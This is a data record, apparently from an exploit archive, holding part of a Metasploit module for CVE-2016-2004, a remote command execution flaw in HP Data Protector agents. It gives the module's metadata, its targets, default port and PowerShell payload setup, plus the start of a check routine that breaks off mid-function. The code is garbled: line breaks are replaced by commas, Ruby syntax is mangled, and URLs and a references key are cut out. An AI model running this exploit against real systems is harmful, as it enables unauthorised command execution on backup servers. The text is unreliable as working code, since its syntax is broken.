{
    "text": "vul_name : HP Data Protector Encrypted Communication Remote Command Execution ， vul_cve : CVE-2016-2004 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， require 'msf/core/exploit/powershell' ， require 'openssl' ， class MetasploitModule < Msf : Exploit : Remote ， Rank = NormalRanking ， include Msf : Exploit : Remote : Tcp ， include Msf : Exploit : Powershell ， super ( update_info ( info ,  ， 'Name' => \"HP Data Protector Encrypted Communication Remote Command Execution\" ,  ， 'Description' => %q{ ， This module exploits a well known remote code execution exploit after establishing encrypted ， control communications with a Data Protector agent. This allows exploitation of Data ， Protector agents that have been configured to only use encrypted control communications. ， This exploit works by executing the payload with Microsoft PowerShell so will only work ， against Windows Vista or newer. Tested against Data Protector 9.0 installed on Windows ， Server 2008 R2. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Jon Barg' ,  # Reported vuln ( originally discovery? ) credited by HP ， 'Ian Lovering' # Metasploit module ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2016-2004' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Platform' => 'win' ,  ， 'Targets' => ，  [  ，  [ 'Automatic' , { 'Arch' => [ ARCH_X86 , ARCH_X86_64 ] } ]  ，  ]  ,  ， 'Payload' => ， { ， 'BadChars' => \"\\x00\" ， } ,  ， 'DefaultOptions' => ， { ， 'WfsDelay' => 30 ,  ， 'RPORT' => 5555 ， } ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => \"Apr 18 2016\" ,  ， 'DefaultTarget' => 0 )  ， end ， def check ，  # For the check command ， connect ， sock.put ( rand_text_alpha_upper ( 64 )  ， response = sock.get_once ( -1 )  ， disconnect",
    "time": "2016.06.07"
}